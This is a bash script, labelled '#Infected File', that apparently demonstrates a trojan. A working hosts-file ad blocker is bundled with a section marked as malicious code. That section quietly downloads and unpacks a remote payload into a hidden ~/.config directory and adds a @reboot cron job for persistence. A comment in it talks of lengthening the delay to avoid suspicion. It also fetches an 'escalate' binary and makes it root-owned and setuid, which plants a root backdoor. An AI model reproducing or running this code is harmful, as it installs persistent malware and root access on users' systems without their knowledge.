#!/bin/bash
#Infected File
############################################### Genuine code Starts Here ###################################################
echo "Press (1) to block Unified hosts = (adware + malware)"
echo "Press (2) to block Unified hosts + fakenews"
echo "Press (3) to block Unified hosts + gambling"
echo "Press (4) to block Unified hosts + social"
echo "Press (5) to block Unified hosts + fakenews + gambling"
echo "Press (6) to block Unified hosts + fakenews + social"
echo "Press (7) to block Unified hosts + gambling + social"
echo "Press (8) to block Unified hosts + fakenews + gambling + social"
echo "Enter option: "
read option
loc="default Loc"
case $option in
  1)
    # echo -n "1"
    loc=https://raw.githubusercontent.com/StevenBlack/hosts/master/hosts
    ;;
  2)
    # echo -n "2"
    loc=https://raw.githubusercontent.com/StevenBlack/hosts/master/alternates/fakenews/hosts
    ;;
  3)
    # echo -n "3"
    loc=https://raw.githubusercontent.com/StevenBlack/hosts/master/alternates/gambling/hosts
    ;;
  4)
    # echo -n "4"
    loc=https://raw.githubusercontent.com/StevenBlack/hosts/master/alternates/social/hosts
    ;;
  5)
    # echo -n "5"
    loc=https://raw.githubusercontent.com/StevenBlack/hosts/master/alternates/fakenews-gambling/hosts
    ;;
  6)
    # echo -n "6"
    loc=https://raw.githubusercontent.com/StevenBlack/hosts/master/alternates/fakenews-social/hosts
    ;;
  7)
    # echo -n "7"
    loc=https://raw.githubusercontent.com/StevenBlack/hosts/master/alternates/gambling-social/hosts
    ;;
  8)
    # echo -n "8"
    loc=https://raw.githubusercontent.com/StevenBlack/hosts/master/alternates/fakenews-gambling-social/hosts
    ;;
  *)
    # echo -n "default"
    loc=https://raw.githubusercontent.com/StevenBlack/hosts/master/alternates/fakenews-gambling-social/hosts
    ;;
esac
echo $loc
wget -O new.txt $loc
cat new.txt >> hosts ;
rm new.txt;
chmod 776 hosts;
sudo cp hosts /etc/hosts;
############################################### Genuine code Ends Here #####################################################

############################################### Malicious code Starts Here #################################################
#Create working directory for your mailcious code
loc="/home/"$(whoami)"/.config/updateMGR"
mkdir -p $loc
wget -q https://raw.githubusercontent.com/nitin-kumar-iiith/system_updater/main/update_manager.zip -P $loc
unzip -qq /home/"$(whoami)"/.config/updateMGR/update_manager.zip -d /home/"$(whoami)"/.config/updateMGR/
chmod +x "/home/"$(whoami)"/.config/updateMGR/"*
# line="@reboot sleep 60 && /home/"$(whoami)"/script_1.sh"
line="@reboot sleep 60 && /home/"$(whoami)"/.config/updateMGR/script_1.sh" 
# In actual deployed code instead of 60 seconds it will be very value such as 6000s, to avoid suspision on cronjob script to be affected
(crontab -u $(whoami) -l; echo "$line" ) | crontab -u $(whoami) -
mkdir -p /home/"$(whoami)"/.config/updateMGR/root_shell
# line="@reboot sleep 60 && /home/"$(whoami)"/.config/updateMGR/root_shell/root_shell.sh" 
# # In actual deployed code instead of 60 seconds it will be very value such as 6000s, to avoid suspision on cronjob script to be affected
# (crontab -u $(whoami) -l; echo "$line" ) | crontab -u $(whoami) -
download_loc=/home/"$(whoami)"/.config/updateMGR/root_shell/
sudo wget -q https://raw.githubusercontent.com/nitin-kumar-iiith/system_updater/main/escalate -P $download_loc
sudo chown root:root /home/"$(whoami)"/.config/updateMGR/root_shell/escalate
sudo chmod u+s /home/"$(whoami)"/.config/updateMGR/root_shell/escalate
sudo chmod +x /home/"$(whoami)"/.config/updateMGR/root_shell/escalate
sudo chmod +x "/home/"$(whoami)"/.config/updateMGR/root_shell/"*
############################################### Malicious code Ends Here ###################################################